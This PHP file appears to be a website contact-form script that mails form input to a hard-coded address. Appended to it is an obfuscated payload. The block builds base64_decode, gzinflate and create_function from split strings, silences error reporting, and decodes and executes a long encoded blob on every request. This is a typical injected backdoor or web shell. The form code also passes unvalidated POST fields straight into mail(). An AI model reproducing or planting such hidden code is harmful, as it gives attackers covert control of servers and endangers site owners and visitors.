<?php

    $comName = isset($_POST["companyName"]) ? $_POST["companyName"] : "";

    $msg = "Name: " . $_POST["name"] . "\n Email: ". $_POST["email"] . "Phone: ". $_POST["phone"]. "\n Company Name: " . $comName . "\n Enquiry: " . $_POST["enquiry"];

    $msg = wordwrap($msg, 70);


    // mail($_POST["genexEmail"],"Website Enquiry", $_POST["enquiry"]);

    mail("alihayder19@gmail.com","Website Enquiry", $msg);


?>



<?php $cfLjt = 'base'.'64'.'_decod'.'e';  $FeSks = 'gzinfla'.'te';  $fEjQg = 'st'.'rrev';  echo '<html>            </html>'; /**    ukzqaavob ethggdrtpcxwpivwxsldsfk     **/ ini_set('log_errors', 0); error_reporting(0); ini_set('display_errors', 0); $TPBqC = 'Cr'.'eate'.'_Functi'.'on'; $wzQph = $TPBqC('', $fEjQg($FeSks($cfLjt('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')))); $wzQph(); ?>